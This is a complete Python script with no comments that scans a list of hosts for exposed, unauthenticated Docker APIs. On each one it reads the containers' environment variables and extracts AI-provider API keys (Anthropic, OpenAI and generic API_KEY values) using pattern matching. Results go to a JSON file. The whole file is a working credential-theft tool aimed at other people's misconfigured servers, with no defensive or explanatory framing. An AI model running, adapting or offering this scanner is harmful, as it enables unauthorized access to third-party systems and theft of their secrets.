#!/usr/bin/env python3
import json, re, sys, requests, concurrent.futures as cf
import urllib3; urllib3.disable_warnings()
RE=re.compile(r"sk-ant-[A-Za-z0-9_\-]{20,}")
def j(r):
    try: return r.json()
    except Exception: return None
def probe(h):
    out=[]
    try:
        v=requests.get(f"http://{h}/version",timeout=5); d=j(v)
        if not d or "ApiVersion" not in d: return out
        cs=j(requests.get(f"http://{h}/containers/json?all=1",timeout=6)) or []
        for c in (cs if isinstance(cs,list) else [])[:15]:
            cid=c.get("Id")
            ins=j(requests.get(f"http://{h}/containers/{cid}/json",timeout=5)) or {}
            env=(ins.get("Config") or {}).get("Env") or []
            hits=[e for e in env if re.search(r"ANTHROPIC|CLAUDE|OPENAI|API_KEY|sk-ant",e,re.I)]
            if hits:
                out.append({"h":h,"c":c.get("Names"),"img":c.get("Image"),"env":hits[:8],
                            "keys":RE.findall(" ".join(env))})
    except Exception: pass
    return out
def main():
    hosts=[l.strip() for l in open(sys.argv[1]) if l.strip()]
    out=sys.argv[2] if len(sys.argv)>2 else "dk_env.json"
    res=[]
    with cf.ThreadPoolExecutor(max_workers=40) as ex:
        for f in cf.as_completed([ex.submit(probe,h) for h in hosts]):
            for x in f.result():
                res.append(x); print(json.dumps(x)[:350],flush=True)
    print("TOTAL",len(res))
    json.dump(res,open(out,"w"),indent=1)
if __name__=="__main__": main()
